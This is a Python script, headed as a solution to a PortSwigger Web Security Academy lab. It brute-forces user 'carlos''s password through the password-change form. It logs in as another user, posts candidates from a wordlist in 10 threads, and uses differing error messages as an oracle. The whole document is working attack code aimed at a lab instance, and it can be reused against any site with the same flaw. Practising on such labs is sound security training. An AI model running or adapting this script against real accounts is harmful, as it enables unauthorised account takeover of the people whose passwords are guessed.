### Portswigger Lab: Password brute-force via password change ###
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed


def initialize_settings():
    """Initialize and return the global settings."""
    return {
        "base_url": "https://0a2700fe03b51511a27240ee003e00e6.web-security-academy.net",
        "login_endpoint": "/login",
        "target_endpoint": "/my-account/change-password",
        "target_username": "carlos",
        "login_username": "wiener",
        "login_password": "qwe", 
        "burp_proxy": {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"},
        "ca_cert_path": "certs/burp_cacert_chain.pem",
        "session": requests.Session(),
        "cookies": {},
    }


def login_and_get_cookies(settings):
    """Log in and retrieve the session cookies."""
    session = settings["session"]
    login_url = f"{settings['base_url']}{settings['login_endpoint']}"
    login_data = {
        "username": settings["login_username"],
        "password": settings["login_password"],
    }

    try:
        response = session.post(
            login_url,
            data=login_data,
            proxies=settings["burp_proxy"],
            verify=settings["ca_cert_path"],
        )
        response.raise_for_status()

        if response.status_code == 200:
            print("Login successful.")
            settings["cookies"] = session.cookies.get_dict()
            print(f"Retrieved cookies: {settings['cookies']}")
        else:
            print(f"Login failed. Status Code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Login request failed: {e}")


def load_password_list():
    try:
        with open("res/passwords.txt", "r") as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        print("Password file not found.")
        return []


def test_password(settings, password):
    """Test a single password by sending it to the password update form."""
    cookies = settings["cookies"]
    cookie_header = "; ".join([f"{key}={value}" for key, value in cookies.items()])
    
    headers = {
        "Cookie": cookie_header,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": f"{settings['base_url']}/my-account/change-password",
    }

    data = {
        "username": settings["target_username"],
        "current-password": password,  # Brute-forcing this field
        "new-password-1": "Howdy",
        "new-password-2": "Cowboy",
    }
    
    try:
        response = settings["session"].post(
            f"{settings['base_url']}{settings['target_endpoint']}",
            data=data,
            headers=headers,
            proxies=settings["burp_proxy"],
            verify=settings["ca_cert_path"],
            allow_redirects=False,
        )
        if "New passwords do not match" in response.text:  # Current password found
            return password
        elif "Current password is incorrect" in response.text:  # Indicates incorrect password
            print(f"Incorrect password: {password}")
        else:
            print(f"Unexpected response for password: {password}, Status Code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Request failed for password {password}: {e}")
    return None


def brute_force_password_update(settings):
    passwords = load_password_list()
    if not passwords:
        print("No passwords loaded.")
        return None

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(test_password, settings, password): password
            for password in passwords
        }

        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f"Valid current password found: {result}")
                executor.shutdown(wait=False, cancel_futures=True)
                return result

    print("No valid current password found.")
    return None


def main():
    settings = initialize_settings()
    
    print("Retrieving session cookie...")
    login_and_get_cookies(settings)
    
    if not settings["cookies"]:
        print("Failed to retrieve session cookie. Exiting.")
    else:
        print("Brute-forcing current password in password update form...")
        valid_password = brute_force_password_update(settings)

        if valid_password:
            print(f"Success! Valid password is: {valid_password}")
        else:
            print("Failed to brute-force current password.")


if __name__ == "__main__":
    main()